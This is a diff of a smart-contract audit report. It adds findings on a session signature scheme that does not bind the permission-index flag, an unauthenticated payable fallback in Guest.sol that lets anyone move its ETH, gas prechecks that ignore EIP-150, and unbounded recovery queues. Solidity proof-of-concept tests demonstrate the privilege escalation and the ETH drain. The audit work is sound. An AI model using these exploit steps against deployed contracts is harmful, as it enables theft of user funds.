@@ -1,3 +1,135 @@
+### [M-1] Relayer can escalate privileges by swapping unsigned call flag in `recoverSignature` of `SessionSig.sol`
+
+**Description** The session system's call signatures do not cryptographically bind to the specific permission or attestation being used for validation. The hashCallWithReplayProtection() function computes signature digests using only call parameters and replay protection fields, excluding the permission/attestation selection flag byte. 
+
+Code Example from `SessionSig.sol`:
+
+```solidity
+function hashCallWithReplayProtection(
+    Payload.Decoded calldata payload,
+    uint256 callIdx
+  ) public view returns (bytes32 callHash) {
+@>  return keccak256(
+      abi.encodePacked(
+        payload.noChainId ? 0 : block.chainid,
+        payload.space,
+        payload.nonce,
+        callIdx,
+        Payload.hashCall(payload.calls[callIdx])
+      )
+    );
+  }
+```
+This allows relayers to modify the flag byte in encodedSignature to select different permissions or attestations without invalidating the signature.
+
+The vulnerability exists because:
+
+1. SessionSig.recoverSignature() reads the flag byte to determine whether to use implicit/explicit validation and which permission/attestation index to apply
+
+2. SessionSig.hashCallWithReplayProtection() omits the flag byte from the signed digest
+
+3. The same signature remains valid regardless of which permission/attestation is selected, as long as the call parameters are compatible
+
+**Impact** Relayers can escalate privileges by:
+1. Switching from restrictive to permissive permissions within the same session
+2. Bypassing intended security controls (selector restrictions, parameter rules, value limits)
+3. Undermining the authorization semantics of the entire session system
+
+This enables MEV extraction, censorship, and unauthorized actions while appearing to use valid user signatures.
+
+**Proof of Concepts**
+The test demonstrates how the same signature works with different permission indices:
+
+Find the below test case in `SessionSig.t.sol`
+<details>
+<summary>Proof of Code</summary>
+
+```solidity
+ function test_FlagByteSwap_ExplicitPermissionIndexNotSigned_AllowsEscalation() external {
+    Payload.Decoded memory payload = _buildPayload(1);
+
+    // First call with BEHAVIOR_ABORT_ON_ERROR (should revert)
+    payload.calls[0] = Payload.Call({
+      to: address(emitter),
+      value: 0,
+      data: abi.encodeWithSelector(emitter.explicitEmit.selector),
+      gasLimit: 0,
+      delegateCall: false,
+      onlyFallback: false,
+      behaviorOnError: Payload.BEHAVIOR_REVERT_ON_ERROR // This should revert
+     });
+
+    // Session permissions
+    SessionPermissions memory sessionPerms = SessionPermissions({
+      signer: sessionWallet.addr,
+      chainId: block.chainid,
+      valueLimit: 0,
+      deadline: uint64(block.timestamp + 1 days),
+      permissions: new Permission[](2)
+    });
+
+    ParameterRule[] memory rule0 = new ParameterRule[](1);
+    // Rules for explicitTarget in call 0.
+    rule0[0] = ParameterRule({
+      cumulative: false,
+      operation: ParameterOperation.EQUAL,
+      value: bytes32(uint256(uint32(~emitter.explicitEmit.selector)) << 224),
+      offset: 0,
+      mask: bytes32(uint256(uint32(0xffffffff)) << 224)
+    });
+
+    ParameterRule[] memory rule1 = new ParameterRule[](1);
+    rule1[0] = ParameterRule({
+      cumulative: false,
+      operation: ParameterOperation.EQUAL,
+      value: bytes32(uint256(uint32(emitter.explicitEmit.selector)) << 224),
+      offset: 0, // offset the param (selector is 4 bytes)
+      mask: bytes32(uint256(uint32(0xffffffff)) << 224)
+    });
+
+    sessionPerms.permissions[0] = Permission({ target: address(emitter), rules: rule0 });
+    sessionPerms.permissions[1] = Permission({ target: address(emitter), rules: rule1 }); // Unlimited access
+
+    string memory topology = PrimitivesRPC.sessionEmpty(vm, identityWallet.addr);
+    string memory sessionPermsJson = _sessionPermissionsToJSON(sessionPerms);
+    topology = PrimitivesRPC.sessionExplicitAdd(vm, sessionPermsJson, topology);
+    string memory sessionSignature =
+      _signAndEncodeRSV(SessionSig.hashCallWithReplayProtection(payload, 0), sessionWallet);
+
+    {
+      uint256 callCount = payload.calls.length;
+      string[] memory callSignatures = new string[](callCount);
+      callSignatures[0] = _explicitCallSignatureToJSON(0, sessionSignature);
+      address[] memory explicitSigners = new address[](1);
+      explicitSigners[0] = sessionWallet.addr;
+      address[] memory implicitSigners = new address[](0);
+
+      bytes memory encodedSigIdx0 =
+        PrimitivesRPC.sessionEncodeCallSignatures(vm, topology, callSignatures, explicitSigners, implicitSigners);
+      vm.expectRevert();
+      sessionManager.recoverSapientSignature(payload, encodedSigIdx0);
+    }
+
+    {
+      uint256 callCount = payload.calls.length;
+      string[] memory callSignatures = new string[](callCount);
+      //Changing flag byte to use permission index 1 instead of 0 as sessionSignature is not bound to flag byte thus allowing escalation
+  @>  callSignatures[0] = _explicitCallSignatureToJSON(1, sessionSignature);
+      address[] memory explicitSigners = new address[](1);
+      explicitSigners[0] = sessionWallet.addr;
+      address[] memory implicitSigners = new address[](0);
+
+      bytes memory encodedSigIdx1 =
+        PrimitivesRPC.sessionEncodeCallSignatures(vm, topology, callSignatures, explicitSigners, implicitSigners);
+
+      sessionManager.recoverSapientSignature(payload, encodedSigIdx1);
+    }
+  }
+```
+</details>
+
+**Recommended mitigation**
+
 ### [L-1] The NESTED flag implementation incorrectly masks bits in `recoverBranch()` of `BaseSig.sol`
 
 **Description** The `NESTED` flag implementation incorrectly masks bits in `recoverBranch()`, swapping the interpretation of external *weight* and *internal threshold*. While the documentation and other flag types **(FLAG_SIGNATURE_SAPIENT, FLAG_SIGNATURE_ERC1271)** consistently use lower 2 bits for weight and upper 2 bits for size/threshold, the `NESTED` flag code reverses this order, creating a critical logic error.
@@ -668,3 +800,213 @@ Find the proof of code in the test file [`Guest.t.sol`](test/modules/guest/Guest
 </details>
 
 **Recommended mitigation**
+Add default case or require behaviorOnError ≤ 2:
+
+```solidity
+if (behaviorOnError > 2) revert InvalidBehavior();
+```
+or
+
+```solidity
+if (!success) {
+    if (behaviorOnError == 0) { /* ignore */ }
+    else if (behaviorOnError == 1) { /* revert */ }
+    else if (behaviorOnError == 2) { /* abort */ }
+    else { revert InvalidBehavior(); }   // <-- catch 3
+}
+```
+
+### [L-11] `Guest.sol` allows anyone to drain ETH from its balance through unauthenticated payable fallback
+
+**Description** The *Guest contract* implements a **payable fallback function** with no access control that decodes arbitrary payloads and executes calls via `LibOptim.call()`. While delegate calls are explicitly blocked, regular calls with ETH value transfers are permitted without restriction enabling any external account to invoke the fallback and transfer ETH from the Guest contract's balance to arbitrary addresses.
+
+Code Example from `Guest.sol`
+
+```solidity
+@>  fallback() external payable {
+      Payload.Decoded memory decoded = Payload.fromPackedCalls(msg.data);
+      console2.log(decoded.noChainId);
+      bytes32 opHash = Payload.hash(decoded);
+      _dispatchGuest(decoded, opHash);
+  }
+```
+In `_dispatchGuest` the calls are executed as:
+
+```solidity
+bool success = LibOptim.call(call.to, call.value, gasLimit == 0 ? gasleft() : gasLimit, call.data);
+```
+**Impact** If the Guest contract ever receives ETH (through accidental transfers, self-destruct recipients, or other means), any external party can craft a malicious payload to drain all ETH to an arbitrary address. 
+
+While the README states Guest is a "helper module" not intended to hold funds, the contract's payable nature means ETH can accumulate, and the lack of access control creates an unnecessary attack surface. Marking this issue as low severity due to the intended usage, but it remains a risk.
+
+**Proof of Concepts**
+1. Create a payload that encodes a call transferring ETH from Guest to an attacker-controlled address.
+2. Invoke the payable fallback with this payload.
+3. Verify that the ETH balance of Guest decreases and the attacker address receives the funds.
+
+Find the proof of code in the test file [`Guest.t.sol`](test/modules/guest/Guest.t.sol):
+
+<details>
+<summary>Proof of Code</summary>
+
+```solidity
+function test_fallback_For_Funds_Withdrawal_By_UnAuthorized_Users() external {
+    uint8 globalFlag = 0x11; // 00010001 binary
+    address myAddress = makeAddr("my address");
+    vm.deal(myAddress, 0);
+    address[] memory parentWallets = new address[](0);
+    Payload.Call[] memory calls = new Payload.Call[](1);
+    calls[0] = Payload.Call({
+      to: myAddress,
+      value: uint256(10000000000000000000),//10 ether
+      data: bytes(""),
+      gasLimit: uint256(0),
+      delegateCall: false,
+      onlyFallback: false,
+      behaviorOnError: uint256(0)
+    });
+    Payload.Decoded memory decodedNew = Payload.Decoded({
+      kind: Payload.KIND_TRANSACTIONS,
+      noChainId: false,
+      // Transaction kind
+      calls: calls,
+      space: uint256(0),
+      nonce: uint256(0),
+      // Message kind
+      message: bytes(""),
+      // Config update kind
+      imageHash: bytes32(0),
+      // Digest kind for 1271
+      digest: bytes32(0),
+      // Parent wallets
+      parentWallets: parentWallets
+    });
+
+    uint8 callFlags = 0x02; // call has only value
+    bytes memory packed = abi.encodePacked(
+      uint8(globalFlag), // 0x11
+      uint8(callFlags), // 0x02
+      myAddress,
+      uint256(10000000000000000000) //10 ether
+    );
+    
+    bytes32 opHash = Payload.hashFor(decodedNew, address(guest));
+    vm.expectEmit(true, true,true,true);
+    emit CallSucceeded(opHash, 0);
+    uint256 guestInitialBalance = 20 ether;
+    hoax(address(guest),guestInitialBalance);
+    (bool ok,) = address(guest).call(packed);
+    assertTrue(ok);
+    assertEq(address(guest).balance, 10 ether, "Guest balance not reduced");
+    assertEq(myAddress.balance, 10 ether, "Balance not received");
+}
+```
+</details>
+
+**Recommended mitigation** 
+1. Implement access control: If ETH handling is intentional, add authorization checks before allowing value transfers from the Guest contract's balance.
+
+2. Remove payable fallback: If ETH transfers are not required, change the fallback function to non-payable to prevent any ETH from being sent to the contract.
+   
+3. Alternatively, implement a whitelist mechanism to restrict which addresses can invoke the fallback function for value transfers.
+
+### [L-12] Gas precheck doesn't account for `EIP-150's 63/64 rule`, causing calls to receive less gas than expected
+
+**Description** The gas precheck logic in `_dispatchGuest` of `Guest.sol`  and `_execute` of `Calls.sol` calculates the gas to forward to sub-calls based on the `gasLimit` specified in the payload. If `gasLimit` is zero, it forwards all remaining gas (`gasleft()`). However, this does not account for *EIP-150's 63/64 rule*, which reduces the gas available to a called contract to 63/64 of the gas sent to it.
+
+When a user specifies gasLimit = X, the check passes if gasleft() >= X, but the actual call may only receive approximately X * 63/64 ≈ 0.984X gas. For calls requiring exactly X gas, this -1.6% shortfall causes unexpected out-of-gas failures despite passing the precheck.
+
+Code Example from `Guest.sol`:
+
+```solidity
+if (gasLimit != 0 && gasleft() < gasLimit) {
+      revert Calls.NotEnoughGas(_decoded, i, gasleft());
+    }
+```
+Example Secnario:
+1. User calculates that a call needs exactly 100,000 gas
+2. Sets gasLimit = 100,000
+3. Check passes: gasleft() = 100,000 >= 100,000
+4. Call forwards only ~98,437 gas due to EIP-150
+5. Call fails with OOG, despite seeming to have enough gas
+
+**Impact** This creates user confusion and requires trial-and-error to find working gas limits. While not a critical security issue (users can work around it by adding a buffer), it degrades user experience and doesn't match the expected behavior suggested by the `NotEnoughGas` error name.
+
+**Recommended mitigation**
+Consider one of the following approaches:
+
+1. Adjust the precheck to account for the 63/64 rule:
+
+```diff
+- if (gasLimit != 0 && gasleft() < gasLimit) {
++ if (gasLimit != 0 && gasleft() < (gasLimit * 64 / 63 + 1)) {
+    revert NotEnoughGas(_decoded, i, gasleft());
+}
+```
+
+2. Update documentation and error messages to clarify that gasLimit is a soft limit and callers should add a buffer (e.g., 2%) to account for EIP-150 reductions.
+
+### [L-13] Recovery module lacks mechanism to remove expired or executed payloads from `queuedPayloadHashes` in `Recovery.sol`
+
+**Description** The `Recovery` module maintains a mapping `queuedPayloadHashes` that stores arrays of payload hashes for each wallet-signer combination. When a payload is queued via `queuePayload()`, its hash is appended to the corresponding array. However, there is no mechanism to remove payload hashes from this array once they have been executed or have expired.
+
+Over time, this leads to storage bloat that increases gas costs for operations querying or iterating over the array.
+
+Code Example from `Recovery.sol`
+```solidity
+mapping(address => mapping(address => uint256)) public timestampForQueuedPayload;
+
+mapping(address => mapping(address => bytes32[])) public queuedPayloadHashes;
+
+function queuePayload(...) external {
+
+
+    if (timestampForQueuedPayload[_wallet][_signer][payloadHash] != 0) {
+        revert AlreadyQueued(_wallet, _signer, payloadHash);
+    }
+    timestampForQueuedPayload[_wallet][_signer][payloadHash] = block.timestamp;
+    queuedPayloadHashes[_wallet][_signer].push(payloadHash);
+@>  // No removal mechanism for executed/expired payloads
+}
+```
+
+**Impact** Unbounded array growth increases gas costs for users over time.
+
+**Recommended mitigation**
+Add a function to allow removal of executed or expired recovery payloads:
+
+```solidity
+function removeExpiredPayloads(
+    address _wallet, 
+    address _signer, 
+    bytes32[] calldata _payloadHashes,
+    uint256 _maxTimelock
+) external {
+    for (uint256 i = 0; i < _payloadHashes.length; i++) {
+        uint256 queuedTime = timestampForQueuedPayload[_wallet][_signer][_payloadHashes[i]];
+        
+        // Verify payload exists and has expired based on reasonable maximum timelock
+        require(
+            queuedTime != 0 && block.timestamp > queuedTime + _maxTimelock, 
+            "Payload not expired"
+        );
+        
+        delete timestampForQueuedPayload[_wallet][_signer][_payloadHashes[i]];
+    }
+    
+    // Rebuild array without expired entries (or implement swap-and-pop pattern)
+    bytes32[] storage hashes = queuedPayloadHashes[_wallet][_signer];
+    uint256 writeIndex = 0;
+    for (uint256 i = 0; i < hashes.length; i++) {
+        if (timestampForQueuedPayload[_wallet][_signer][hashes[i]] != 0) {
+            hashes[writeIndex] = hashes[i];
+            writeIndex++;
+        }
+    }
+    // Trim array to new length
+    while (hashes.length > writeIndex) {
+        hashes.pop();
+    }
+}
+```
+**Note:** This function should include appropriate access controls to prevent unauthorized removals.
